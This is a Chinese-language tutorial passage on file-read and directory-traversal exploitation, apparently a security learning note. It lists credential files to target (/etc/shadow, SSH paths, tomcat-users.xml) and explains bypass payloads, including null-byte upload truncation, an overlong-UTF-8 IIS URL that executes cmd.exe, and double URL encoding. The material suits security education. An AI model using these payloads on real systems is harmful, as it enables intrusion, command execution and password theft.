1. 利用指南

基本思路就是尝试读取敏感文件以获取尽可能多的信息。
比如， /etc/issue 可以确认 Linux 主机的发行版，
其中 .bash_history, ssh相关路径 中可能含有大量敏感信息，
获取到 /etc/shadow 则可以直接使用 John The Ripper 尝试枚举 root 密码。
Tomcat 控制台可读取用户密码 /usr/local/tomcat/conf/tomcat-users.xml。

顺带提供了一些黑盒和白盒状态下挖掘此类漏洞的一些思路，主要以 PHP 为例。

# 补充！

​ 这里我将最近看到的内容补充进来，对这些payload有一些解释。

首先第一点： %00截断。这个除了低版本php截断之外。这个在绕过以单纯的扩展名结尾，在windows上有独特的特性（经过实验），在burp中改包1.php%00.jpg。绕过上传之后windows对这个文件名的解析的特性会被解析成1.php。

第二点也是这几天看了很多资料才找到知识点，很多网上的教程知识对payload一贴而没有具体的解释，很多国外的文献翻译过来也只是解释为 过长的utf-8 unicode编码。这里首先需要有对unicode的补充，utf-8仅仅是unicode的一种实现形式，也是一种子集。通过1、2、3、4字节来表示一个字符。具体的链接：http://www.ruanyifeng.com/blog/2007/10/ascii_unicode_and_utf-8.html 比较通俗易懂。

所以我们可以将/这个符号字节加长来绕过对unicode字集的判断。直接上图：

重点是这句话： The character “/“ can be represented in single-, double-, and triple-byte UTF-8 encoding formats as follows: 文章当中举的例子是iis的unicode的bug。

pl: 192.168.7.21/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+d:\ 绕过../的判断穿越web目录执行命令。
windows有时候目录穿越的符号是\，url编码是%5c 那么就是0101 1100。Unicode编码之后：1100 0001 1001 1100 就是%c1%9c。

漏洞的成因是因为：UTF-8编码规范规定:“UTF-8解码器不能接受长度超过编码字符所需的UTF-8序列。”任何过长的UTF-8序列都可能被滥用，以绕过只寻找最短编码的UTF-8子串测试。”IIS没有遵守这一准则，因此，这个漏洞允许成千上万的黑客在IIS服务器上运行任意命令。所以当路径参数出现unicode编码时，尤其在get方法的参数中（解码更容易利用），很有可能存在漏洞。utf-16就不详解了：点–>%u002e 反斜杠–>%u2215 正斜杠–>%u2216。

第三点： 多重解码漏洞 “%25%32%66.” 代表“%2f”

参考链接： https://flylib.com/books/en/2.819.1.43/1/
